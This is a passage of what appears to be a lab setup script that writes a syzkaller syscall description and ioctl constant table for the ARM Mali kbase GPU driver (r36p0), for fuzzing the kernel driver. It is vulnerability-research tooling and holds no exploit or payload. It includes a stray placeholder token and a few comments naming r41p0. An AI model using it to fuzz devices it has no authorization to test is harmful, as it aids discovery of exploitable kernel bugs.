#     the 24B MEM_JIT_INIT, distinguished by _IOC_SIZE (all three survive in
#     r36p0 headers; removed in UK 11.36 / r41p0).
#   * - include <gpu/arm/midgard/mali_base_common_kernel.h> (r41p0-only
#     header; r36p0 keeps that content inside mali_base_kernel.h).
#   * every other modelled struct is byte-identical between the two releases
#     (base_jd_atom_v2 56B with jit_id[2]+renderpass_id, hwcnt metadata 32B
#     with cycles, timeinfo in.paddings __u32[7], mem_jit_init 24B) — proven
#     by the _Static_assert gate in layout_check_r36p0.c (see below).
# - Dispatch cross-check (mali_kbase_core_linux.c switch in r36p0): every
#   modelled ioctl is a live case for a NO_MALI build; JM-only cases
#   (JOB_SUBMIT, POST_TERM, SOFT_EVENT_UPDATE, KINSTR_JM_FD) are behind
#   #if !MALI_USE_CSF and are correct for this JM-mode description.
# - Excluded as unreachable (documented, not silently): CINSTR_GWT_*
#   (needs CONFIG_MALI_CINSTR_GWT, unset in the lab fragment),
#   TLSTREAM_STATS/EXTRA_TYPE/MY_IOCTL/TEST_TYPE (MALI_UNIT_TEST only),
#   legacy KBASE_IOCTL_HWCNT_ENABLE/DUMP/CLEAR (removed before r36p0),
#   CS_* queue/KCPU/tiler ioctls + MEM_ALLOC_EX (MALI_USE_CSF — modelled
#   separately in dev_mali_r36p0-csf.txt, the MALI_MODE=csf companion).
#   GET_PROFILING_CONTROLS does not exist in r36p0 headers.
#
# Union-style ioctl structs: kbase passes in/out views of one buffer. Fields
# that alias the kernel's out-view slot are typed as the out value and marked
# (inout), e.g. MEM_ALLOC@8 = commit_pages(in)/gpu_va(out); the executor then
# copyouts the kernel-returned GPU VA into the gpu_addr resource, enabling
# alloc -> use -> free chaining while keeping the modeled size == the exact
# release _IOC_SIZE. See evidence/06 for the offset mapping table.
#
# Consts in dev_mali_r36p0.txt.const are extracted from the r36p0 headers by
# the bootstrap script (extract_consts, F5-validated overlay recipe):
#   bin/syz-extract -arch amd64,arm64 -sourcedir <hardlink mirror of $KT with
#       the uapi/gpu shadow dropped> -includedirs harness/release_uapi/r36p0 \
#       dev_mali_r36p0.txt
# Both arches are extracted because sysgen only emits syscall entries for
# arches declared in the const file; mali UAPI consts are LP64/asm-generic
# identical, and the run gates on that equality.
# Keep this file `meta noextract` so `make extract` cannot clobber the
# release-matched consts with values from an unrelated kernel tree.
meta noextract


include <gpu/arm/midgard/mali_base_kernel.h>
include <gpu/arm/midgard/jm/mali_base_jm_kernel.h>
include <gpu/arm/midgard/mali_kbase_ioctl.h>
include <gpu/arm/midgard/mali_kbase_hwcnt_reader.h>
include <uapi/linux/fcntl.h>
include <linux/types.h>

resource fd_bifrost[fd]
resource gpu_addr[int64]: BASEP_MEM_INVALID_HANDLE, BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE
resource user_addr[int64]: -1
resource fd_fence[fd]
resource fd_hwcnt[fd]

openat$bifrost(fd const[AT_FDCWD], file ptr[in, string["/dev/bifrost"]], flags flags[open_flags], mode const[0]) fd_bifrost
# Our NO_MALI build registers miscdevice mali0 -> /dev/mali0
openat$mali(fd const[AT_FDCWD], file ptr[in, string["/dev/mali0"]], flags flags[open_flags], mode const[0]) fd_bifrost

# GPU VA mmap: kbase's vm_pgoff encodes the region cookie (Phase D smoke:
# mmap(offset=cookie) materializes the SAME_VA region).
mmap$bifrost(addr const[0], len len[addr], prot flags[mmap_prot], flags flags[mmap_flags], fd fd_bifrost, offset fileoff) user_addr
munmap$bifrost(addr user_addr, len intptr)

ioctl$KBASE_IOCTL_JOB_SUBMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_JOB_SUBMIT], arg ptr[in, kbase_ioctl_job_submit])
ioctl$KBASE_IOCTL_POST_TERM(fd fd_bifrost, cmd const[KBASE_IOCTL_POST_TERM], arg const[0])
ioctl$KBASE_IOCTL_SOFT_EVENT_UPDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_SOFT_EVENT_UPDATE], arg ptr[in, kbase_ioctl_soft_event_update])
ioctl$KBASE_IOCTL_VERSION_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_VERSION_CHECK_RESERVED(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK_RESERVED], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_SET_FLAGS(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_FLAGS], arg ptr[in, kbase_ioctl_set_flags])
ioctl$KBASE_IOCTL_GET_GPUPROPS(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_GPUPROPS], arg ptr[inout, kbase_ioctl_get_gpuprops])
ioctl$KBASE_IOCTL_MEM_ALLOC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALLOC], arg ptr[inout, kbase_ioctl_mem_alloc])
# in-view only: out.value aliases the gpu_addr@0 slot; observing it would
# poison the gpu_addr resource with non-address query values.
ioctl$KBASE_IOCTL_MEM_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_QUERY], arg ptr[in, kbase_ioctl_mem_query])
ioctl$KBASE_IOCTL_MEM_FREE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FREE], arg ptr[in, kbase_ioctl_mem_free])
ioctl$KBASE_IOCTL_HWCNT_READER_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_READER_SETUP], arg ptr[in, kbase_ioctl_hwcnt_reader_setup]) fd_hwcnt
ioctl$KBASE_IOCTL_HWCNT_SET(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_SET], arg ptr[inout, kbase_ioctl_hwcnt_values])
ioctl$KBASE_IOCTL_DISJOINT_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_DISJOINT_QUERY], arg ptr[out, kbase_ioctl_disjoint_query])
ioctl$KBASE_IOCTL_GET_DDK_VERSION(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_DDK_VERSION], arg ptr[inout, kbase_ioctl_get_ddk_version])
ioctl$KBASE_IOCTL_MEM_JIT_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT], arg ptr[in, kbase_ioctl_mem_jit_init])
# r36p0-only legacy JIT family on the SAME nr 14 (8B + 16B; distinguished by
# _IOC_SIZE, same pattern Phase F5 modeled for r28p0) — removed in r41p0.
ioctl$KBASE_IOCTL_MEM_JIT_INIT_10_2(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_10_2], arg ptr[in, kbase_ioctl_mem_jit_init_10_2])
ioctl$KBASE_IOCTL_MEM_JIT_INIT_11_5(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_11_5], arg ptr[in, kbase_ioctl_mem_jit_init_11_5])
ioctl$KBASE_IOCTL_MEM_EXEC_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_EXEC_INIT], arg ptr[in, kbase_ioctl_mem_exec_init])
ioctl$KBASE_IOCTL_MEM_SYNC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_SYNC], arg ptr[in, kbase_ioctl_mem_sync])
# in-view only: out.offset aliases gpu_addr@0 (not an address).
ioctl$KBASE_IOCTL_MEM_FIND_CPU_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_CPU_OFFSET], arg ptr[in, kbase_ioctl_mem_find_cpu_offset])
ioctl$KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET], arg ptr[inout, kbase_ioctl_mem_find_gpu_start_and_offset])
ioctl$KBASE_IOCTL_GET_CONTEXT_ID(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CONTEXT_ID], arg ptr[out, kbase_ioctl_get_context_id])
ioctl$KBASE_IOCTL_TLSTREAM_ACQUIRE(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_ACQUIRE], arg ptr[in, kbase_ioctl_tlstream_acquire])
ioctl$KBASE_IOCTL_TLSTREAM_FLUSH(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_FLUSH], arg const[0])
ioctl$KBASE_IOCTL_MEM_COMMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_COMMIT], arg ptr[in, kbase_ioctl_mem_commit])
ioctl$KBASE_IOCTL_MEM_ALIAS(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALIAS], arg ptr[inout, kbase_ioctl_mem_alias])
ioctl$KBASE_IOCTL_MEM_IMPORT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_IMPORT], arg ptr[inout, kbase_ioctl_mem_import])
ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FLAGS_CHANGE], arg ptr[in, kbase_ioctl_mem_flags_change])
ioctl$KBASE_IOCTL_STREAM_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_STREAM_CREATE], arg ptr[in, kbase_ioctl_stream_create]) fd_fence
ioctl$KBASE_IOCTL_FENCE_VALIDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_FENCE_VALIDATE], arg ptr[in, kbase_ioctl_fence_validate])
ioctl$KBASE_IOCTL_MEM_PROFILE_ADD(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_PROFILE_ADD], arg ptr[in, kbase_ioctl_mem_profile_add])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_MAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_MAP], arg ptr[in, kbase_ioctl_sticky_resource_map])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_UNMAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_UNMAP], arg ptr[in, kbase_ioctl_sticky_resource_unmap])
ioctl$KBASE_IOCTL_KINSTR_JM_FD(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_JM_FD], arg ptr[in, kbase_kinstr_jm_fd])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO], arg ptr[inout, kbase_ioctl_kinstr_prfcnt_enum_info])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_SETUP], arg ptr[in, kbase_ioctl_kinstr_prfcnt_setup])
# in-view only (32B): out view aliases the request_flags/paddings slots.
ioctl$KBASE_IOCTL_GET_CPU_GPU_TIMEINFO(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CPU_GPU_TIMEINFO], arg ptr[in, kbase_ioctl_get_cpu_gpu_timeinfo])
ioctl$KBASE_IOCTL_CONTEXT_PRIORITY_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_CONTEXT_PRIORITY_CHECK], arg ptr[inout, kbase_ioctl_context_priority_check])
ioctl$KBASE_IOCTL_SET_LIMITED_CORE_COUNT(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_LIMITED_CORE_COUNT], arg ptr[in, kbase_ioctl_set_limited_core_count])

# hwcnt reader fd (returned by HWCNT_READER_SETUP) — mali_kbase_hwcnt_reader.h.
ioctl$KBASE_HWCNT_READER_GET_HWVER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_HWVER], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_SIZE(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_SIZE], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_DUMP(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DUMP], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_CLEAR(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_CLEAR], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER], arg ptr[out, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES], arg ptr[out, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER], arg ptr[in, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES], arg ptr[in, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_SET_INTERVAL(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_SET_INTERVAL], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_ENABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_ENABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_DISABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DISABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_API_VERSION(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION], arg ptr[in, int32])
# same nr 0xFF, size-encoded newer variant (release drift axis)
ioctl$KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES], arg ptr[in, kbase_hwcnt_reader_api_version])

type base_atom_id int8

base_jd_udata {
	blob	array[int64, 2]
}

base_dependency {
	atom_id			base_atom_id
	dependency_type	flags[base_jd_dep_type, int8]
}

base_jd_atom_v2 {
	jc			int64
	udata			base_jd_udata
	extres_list		int64
	nr_extres		int16
	jit_id			array[int8, 2]
	pre_dep			array[base_dependency, 2]
	atom_number		base_atom_id
	prio			flags[base_jd_prio, int8]
	device_nr		int8
	jobslot			int8
	core_req		flags[base_jd_core_req, int32]
	renderpass_id	int8
	padding			array[const[0, int8], 7]
}

kbase_ioctl_job_submit {
	addr		ptr64[in, array[base_jd_atom_v2]]
	nr_atoms	len[addr, int32]
# sizeof(base_jd_atom_v2)
	stride		const[56, int32]
}

kbase_ioctl_version_check {
	major	int16
	minor	int16
}

kbase_ioctl_set_flags {
	create_flags	flags[basep_context_create_kernel_flags, int32]
}

kbase_ioctl_get_gpuprops {
	buffer	ptr64[out, array[int8]]
	size	len[buffer, int32]
	flags	const[0, int32]
}

kbase_ioctl_mem_alloc {
# C union (32B): in {va_pages, commit_pages, extension, flags};
# out {flags@0, gpu_va@8}. @8 is modeled as the out view (gpu_va) so
# returned cookies populate gpu_addr (input value lands in commit_pages).
	va_pages	int64
	gpu_va		gpu_addr	(inout)
	extent		int64
	flags		flags[base_mem_alloc_flags, int64]
}

kbase_ioctl_mem_query {
	gpu_addr	gpu_addr
	query		flags[kbase_ioctl_mem_query_flags, int64]
}

kbase_ioctl_mem_free {
	gpu_addr	gpu_addr
}

kbase_ioctl_hwcnt_reader_setup {
	buffer_count	int32
	fe_bm			int32
	shader_bm		int32
	tiler_bm		int32
	mmu_l2_bm		int32
}

kbase_ioctl_hwcnt_values {
	data	ptr64[out, array[int8]]
	size	len[data, int32]
	padding	const[0, int32]
}

kbase_ioctl_disjoint_query {
	counter	int32
}

kbase_ioctl_get_ddk_version {
	version_buffer	ptr64[out, array[int8]]
	size			len[version_buffer, int32]
	padding			const[0, int32]
}

kbase_ioctl_mem_jit_init {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
	phys_pages		int64
}

# r36p0: struct kbase_ioctl_mem_jit_init_10_2 { __u64 va_pages } — 8B.
kbase_ioctl_mem_jit_init_10_2 {
	va_pages	int64
}

# r36p0: struct kbase_ioctl_mem_jit_init_11_5 — 16B (va_pages + 3 u8 + u8[5]).
kbase_ioctl_mem_jit_init_11_5 {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
}

kbase_ioctl_mem_exec_init {
	va_pages	int64
}

kbase_ioctl_mem_sync {
	handle		gpu_addr
	user_addr	user_addr
	size		int64
	type		flags[base_syncset_op_flags, int8]
	padding		array[const[0, int8], 7]
}

kbase_ioctl_mem_find_cpu_offset {
	gpu_addr	gpu_addr
	cpu_addr	user_addr
	size		int64
}

kbase_ioctl_mem_find_gpu_start_and_offset {
# union (16B): in {gpu_addr, size}; out {start@0, offset@8}. @0 doubles as
# out.start (a live region base) -> inout gpu_addr for chaining.
	gpu_addr	gpu_addr	(inout)
	size		int64		(inout)
}

kbase_ioctl_get_context_id {
	id	int32
}

kbase_ioctl_tlstream_acquire {
	flags	int32
}

kbase_ioctl_mem_commit {
	gpu_addr	gpu_addr
	pages		int64
}

kbase_ioctl_mem_alias {
# union (32B): in {flags, stride, nents, aliasing_info};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	gpu_va		gpu_addr	(inout)
	nents		len[aliasing_info, int64]
	aliasing_info	ptr64[in, array[base_mem_aliasing_info]]
}

base_mem_aliasing_info {
	handle	gpu_addr
	offset	int64
	length	int64
}

kbase_ioctl_mem_import {
# union (24B): in {flags, phandle, type, padding};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	phandle		gpu_addr	(inout)
	type		flags[base_mem_import_type, int32]
	padding		const[0, int32]
}

kbase_ioctl_mem_flags_change {
	gpu_va	gpu_addr
	flags	flags[base_mem_alloc_flags, int64]
	mask	int64
}

kbase_ioctl_stream_create {
	name	array[int8, 32]
}

kbase_ioctl_fence_validate {
	fd	fd_fence
}

kbase_ioctl_mem_profile_add {
	buffer	ptr64[in, array[int8]]
	len		len[buffer, int32]
	padding	const[0, int32]
}

kbase_ioctl_sticky_resource_map {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_sticky_resource_unmap {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_soft_event_update {
	event		gpu_addr
	new_status	int32
	flags		const[0, int32]
}

kbase_ioctl_get_cpu_gpu_timeinfo {
	request_flags	flags[base_timerequest_allowed_flags, int32]
	paddings		array[const[0, int8], 28]
}

kbase_kinstr_jm_fd {
	count	int16
	padding	array[const[0, int8], 6]
}

kbase_ioctl_kinstr_prfcnt_enum_info {
	info_item_size	int32
	info_item_count	int32
	info_list_ptr	ptr64[out, array[int8]]
}

kbase_ioctl_kinstr_prfcnt_setup {
	request_item_count	int32
	request_item_size	int32
	requests_ptr		ptr64[in, array[int8]]
}

kbase_ioctl_context_priority_check {
	priority	int8
}

kbase_ioctl_set_limited_core_count {
	max_core_count	int8
}

# r41p0 has TWO generations of the buffer ioctls on the SAME nr (0x20/0x21),
# distinguished by _IOC_SIZE: legacy (16B, offsetof-cycles) and *_WITH_CYCLES
# (32B full metadata). Model both, release-exact.
kbase_hwcnt_reader_metadata_legacy {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
}

kbase_hwcnt_reader_api_version {
	version	int32
	features int32
}

kbase_hwcnt_reader_metadata_cycles {
	top			int64
	shader_cores	int64
}

kbase_hwcnt_reader_metadata {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
	cycles		kbase_hwcnt_reader_metadata_cycles
}

base_jd_dep_type = BASE_JD_DEP_TYPE_INVALID, BASE_JD_DEP_TYPE_DATA, BASE_JD_DEP_TYPE_ORDER
base_jd_prio = BASE_JD_PRIO_MEDIUM, BASE_JD_PRIO_HIGH, BASE_JD_PRIO_LOW
base_jd_core_req = BASE_JD_REQ_DEP, BASE_JD_REQ_FS, BASE_JD_REQ_CS, BASE_JD_REQ_T, BASE_JD_REQ_CF, BASE_JD_REQ_V, BASE_JD_REQ_FS_AFBC, BASE_JD_REQ_EVENT_COALESCE, BASE_JD_REQ_COHERENT_GROUP, BASE_JD_REQ_PERMON, BASE_JD_REQ_EXTERNAL_RESOURCES, BASE_JD_REQ_SOFT_JOB, BASE_JD_REQ_ONLY_COMPUTE, BASE_JD_REQ_SPECIFIC_COHERENT_GROUP, BASE_JD_REQ_EVENT_ONLY_ON_FAILURE, BASE_JD_REQ_SKIP_CACHE_START, BASE_JD_REQ_SKIP_CACHE_END, BASE_JD_REQ_JOB_SLOT, BASE_JD_REQ_START_RENDERPASS, BASE_JD_REQ_END_RENDERPASS
kbase_ioctl_mem_query_flags = KBASE_MEM_QUERY_COMMIT_SIZE, KBASE_MEM_QUERY_VA_SIZE, KBASE_MEM_QUERY_FLAGS
base_syncset_op_flags = BASE_SYNCSET_OP_MSYNC, BASE_SYNCSET_OP_CSYNC
# 0x400000-0x2000000 are individual bits of BASE_MEM_GROUP_ID_MASK
# (r41p0 has no BASE_MEM_TILER_ALIGN_TOP_EXTENT_MAX_PAGES — ChromeOS-bifrost only)
base_mem_alloc_flags = BASE_MEM_PROT_CPU_RD, BASE_MEM_PROT_CPU_WR, BASE_MEM_PROT_GPU_RD, BASE_MEM_PROT_GPU_WR, BASE_MEM_PROT_GPU_EX, BASEP_MEM_PERMANENT_KERNEL_MAPPING, BASE_MEM_GPU_VA_SAME_4GB_PAGE, BASEP_MEM_NO_USER_FREE, BASE_MEM_RESERVED_BIT_8, BASE_MEM_GROW_ON_GPF, BASE_MEM_COHERENT_SYSTEM, BASE_MEM_COHERENT_LOCAL, BASE_MEM_CACHED_CPU, BASE_MEM_SAME_VA, BASE_MEM_NEED_MMAP, BASE_MEM_COHERENT_SYSTEM_REQUIRED, BASE_MEM_PROTECTED, BASE_MEM_DONT_NEED, BASE_MEM_IMPORT_SHARED, BASE_MEM_RESERVED_BIT_19, BASE_MEM_TILER_ALIGN_TOP, BASE_MEM_UNCACHED_GPU, 0x400000, 0x800000, 0x1000000, 0x2000000, BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP, BASE_MEM_FLAG_MAP_FIXED
base_mem_import_type = BASE_MEM_IMPORT_TYPE_INVALID, BASE_MEM_IMPORT_TYPE_UMM, BASE_MEM_IMPORT_TYPE_USER_BUFFER
# 0x08-0x20 are individual bits of BASEP_CONTEXT_MMU_GROUP_ID_MASK
basep_context_create_kernel_flags = BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED, 0x8, 0x10, 0x20, 0x40
base_timerequest_allowed_flags = BASE_TIMEINFO_MONOTONIC_FLAG, BASE_TIMEINFO_TIMESTAMP_FLAG, BASE_TIMEINFO_CYCLE_COUNTER_FLAG, BASE_TIMEINFO_KERNEL_SOURCE_FLAG, BASE_TIMEINFO_USER_SOURCE_FLAG
__PL_08__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0.txt" "62e4933cd4cb5a3c55f9f8aeaf896795765a9e7d2bbd8c1f5395ac4a63e4aa7a"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0.txt.const")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0.txt.const" <<'__PL_09__'
# Code generated by syz-sysgen. DO NOT EDIT.
arches = amd64, arm64
AT_FDCWD = 18446744073709551516
BASEP_MEM_INVALID_HANDLE = 0
BASEP_MEM_NO_USER_FREE = 128
BASEP_MEM_PERMANENT_KERNEL_MAPPING = 32
BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE = 16384
BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED = 2
BASE_JD_DEP_TYPE_DATA = 1
BASE_JD_DEP_TYPE_INVALID = 0
BASE_JD_DEP_TYPE_ORDER = 2
BASE_JD_PRIO_HIGH = 1
BASE_JD_PRIO_LOW = 2
BASE_JD_PRIO_MEDIUM = 0
BASE_JD_REQ_CF = 8
BASE_JD_REQ_COHERENT_GROUP = 64
BASE_JD_REQ_CS = 2
BASE_JD_REQ_DEP = 0
BASE_JD_REQ_END_RENDERPASS = 524288
BASE_JD_REQ_EVENT_COALESCE = 32
BASE_JD_REQ_EVENT_ONLY_ON_FAILURE = 4096
BASE_JD_REQ_EXTERNAL_RESOURCES = 256
BASE_JD_REQ_FS = 1
BASE_JD_REQ_FS_AFBC = 8192
BASE_JD_REQ_JOB_SLOT = 131072
BASE_JD_REQ_ONLY_COMPUTE = 1024
BASE_JD_REQ_PERMON = 128
BASE_JD_REQ_SKIP_CACHE_END = 65536
BASE_JD_REQ_SKIP_CACHE_START = 32768
BASE_JD_REQ_SOFT_JOB = 512
BASE_JD_REQ_SPECIFIC_COHERENT_GROUP = 2048
BASE_JD_REQ_START_RENDERPASS = 262144
BASE_JD_REQ_T = 4
BASE_JD_REQ_V = 16
BASE_MEM_CACHED_CPU = 4096
BASE_MEM_COHERENT_LOCAL = 2048
BASE_MEM_COHERENT_SYSTEM = 1024
BASE_MEM_COHERENT_SYSTEM_REQUIRED = 32768
BASE_MEM_DONT_NEED = 131072
BASE_MEM_FLAG_MAP_FIXED = 134217728
BASE_MEM_GPU_VA_SAME_4GB_PAGE = 64
BASE_MEM_GROW_ON_GPF = 512
BASE_MEM_IMPORT_SHARED = 262144
BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP = 67108864
BASE_MEM_IMPORT_TYPE_INVALID = 0
BASE_MEM_IMPORT_TYPE_UMM = 2
BASE_MEM_IMPORT_TYPE_USER_BUFFER = 3
BASE_MEM_NEED_MMAP = 16384
BASE_MEM_PROTECTED = 65536
BASE_MEM_PROT_CPU_RD = 1
BASE_MEM_PROT_CPU_WR = 2
BASE_MEM_PROT_GPU_EX = 16
BASE_MEM_PROT_GPU_RD = 4
BASE_MEM_PROT_GPU_WR = 8
BASE_MEM_RESERVED_BIT_19 = 524288
BASE_MEM_RESERVED_BIT_8 = 256
BASE_MEM_SAME_VA = 8192
BASE_MEM_TILER_ALIGN_TOP = 1048576
BASE_MEM_UNCACHED_GPU = 2097152
BASE_SYNCSET_OP_CSYNC = 2
BASE_SYNCSET_OP_MSYNC = 1
BASE_TIMEINFO_CYCLE_COUNTER_FLAG = 4
BASE_TIMEINFO_KERNEL_SOURCE_FLAG = 1073741824
BASE_TIMEINFO_MONOTONIC_FLAG = 1
BASE_TIMEINFO_TIMESTAMP_FLAG = 2
BASE_TIMEINFO_USER_SOURCE_FLAG = 2147483648
KBASE_HWCNT_READER_CLEAR = 1074052625
KBASE_HWCNT_READER_DISABLE_EVENT = 1074052673
KBASE_HWCNT_READER_DUMP = 1074052624
KBASE_HWCNT_READER_ENABLE_EVENT = 1074052672
KBASE_HWCNT_READER_GET_API_VERSION = 1074052863
KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES = 1074315007
KBASE_HWCNT_READER_GET_BUFFER = 2148580896
KBASE_HWCNT_READER_GET_BUFFER_SIZE = 2147794433
KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES = 2149629472
KBASE_HWCNT_READER_GET_HWVER = 2147794432
KBASE_HWCNT_READER_PUT_BUFFER = 1074839073
KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES = 1075887649
KBASE_HWCNT_READER_SET_INTERVAL = 1074052656
KBASE_IOCTL_CONTEXT_PRIORITY_CHECK = 3221323830
KBASE_IOCTL_DISJOINT_QUERY = 2147778572
KBASE_IOCTL_FENCE_VALIDATE = 1074036761
KBASE_IOCTL_GET_CONTEXT_ID = 2147778577
KBASE_IOCTL_GET_CPU_GPU_TIMEINFO = 3223355442
KBASE_IOCTL_GET_DDK_VERSION = 1074823181
KBASE_IOCTL_GET_GPUPROPS = 1074823171
KBASE_IOCTL_HWCNT_READER_SETUP = 1075085320
KBASE_IOCTL_HWCNT_SET = 1074823200
KBASE_IOCTL_JOB_SUBMIT = 1074823170
KBASE_IOCTL_KINSTR_JM_FD = 3221782579
KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO = 3222306872
KBASE_IOCTL_KINSTR_PRFCNT_SETUP = 3222306873
KBASE_IOCTL_MEM_ALIAS = 3223355413
KBASE_IOCTL_MEM_ALLOC = 3223355397
KBASE_IOCTL_MEM_COMMIT = 1074823188
KBASE_IOCTL_MEM_EXEC_INIT = 1074298918
KBASE_IOCTL_MEM_FIND_CPU_OFFSET = 3222831120
KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET = 3222306847
KBASE_IOCTL_MEM_FLAGS_CHANGE = 1075347479
KBASE_IOCTL_MEM_FREE = 1074298887
KBASE_IOCTL_MEM_IMPORT = 3222831126
KBASE_IOCTL_MEM_JIT_INIT = 1075347470
KBASE_IOCTL_MEM_JIT_INIT_10_2 = 1074298894
KBASE_IOCTL_MEM_JIT_INIT_11_5 = 1074823182
KBASE_IOCTL_MEM_PROFILE_ADD = 1074823195
KBASE_IOCTL_MEM_QUERY = 3222306822
KBASE_IOCTL_MEM_SYNC = 1075871759
KBASE_IOCTL_POST_TERM = 32772
KBASE_IOCTL_SET_FLAGS = 1074036737
KBASE_IOCTL_SET_LIMITED_CORE_COUNT = 1073840183
KBASE_IOCTL_SOFT_EVENT_UPDATE = 1074823196
KBASE_IOCTL_STICKY_RESOURCE_MAP = 1074823197
KBASE_IOCTL_STICKY_RESOURCE_UNMAP = 1074823198
KBASE_IOCTL_STREAM_CREATE = 1075871768
KBASE_IOCTL_TLSTREAM_ACQUIRE = 1074036754
KBASE_IOCTL_TLSTREAM_FLUSH = 32787
KBASE_IOCTL_VERSION_CHECK = 3221520384
KBASE_IOCTL_VERSION_CHECK_RESERVED = 3221520436
